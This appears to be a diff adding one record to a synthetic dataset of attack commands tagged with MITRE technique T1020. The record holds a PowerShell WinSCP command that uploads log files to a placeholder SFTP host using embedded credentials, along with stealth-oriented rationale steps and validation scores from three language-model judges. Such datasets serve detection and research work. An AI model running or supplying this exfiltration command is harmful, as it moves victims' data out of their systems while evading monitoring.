@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$r=\"/upl/\"; & 'C:\\Program Files (x86)\\WinSCP\\WinSCP.com' /ini=nul /command 'option batch on' 'option confirm off' 'open sftp://exfil:S3cr3t!@192.0.2.55:2222/ -hostkey=\"ssh-ed25519 255 SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\"' (\"put -speed=512 -resume C:\\ProgramData\\*\\*.log `\"$r`\"\") 'exit' | Out-Null 2>$null",
+  "explanation": "Automates exfiltration of log files over a non-standard SFTP port with bandwidth limiting and resume support to reduce network anomalies.",
+  "rationale_steps": [
+    "Connect to SFTP on alternate port to blend with site policy",
+    "Throttle transfer rate for stealth",
+    "Upload targeted logs recursively with resume",
+    "Run non-interactively and suppress output"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-1f3f2541-5701d711",
+  "source_prompt_hash": "1f3f2541",
+  "timestamp_utc": "2025-09-30T09:07:17.472275Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell command is well-formed with balanced quoting/escaping and valid WinSCP switches; pipeline and call operator usage are correct.",
+        "semantic_score": 4,
+        "semantic_justification": "It automates exfiltration via SFTP on a non-standard port with speed limiting and resume to a specified remote path, though the use of a documentation IP and ineffective placement of 2>$null are minor realism gaps.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T04:05:08.147275Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, variable assignment, command chaining, and correct WinSCP parameter syntax including nested quotes that are properly escaped.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements automated exfiltration by using WinSCP to transfer log files over SFTP with bandwidth limiting (speed=512), resume capability, and authentication credentials while suppressing output, which aligns perfectly with the T1020 technique.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T05:56:22.451962Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with correct Powershell syntax for variable assignment, external command execution, argument passing, and output redirection, including proper handling of quotes and variable expansion.",
+        "semantic_score": 5,
+        "semantic_justification": "The command flawlessly achieves the claimed intent of automated log file exfiltration via SFTP, utilizing a non-standard port, bandwidth limiting, and resume support, perfectly aligning with T1020 Automated Exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:56:38.787270Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
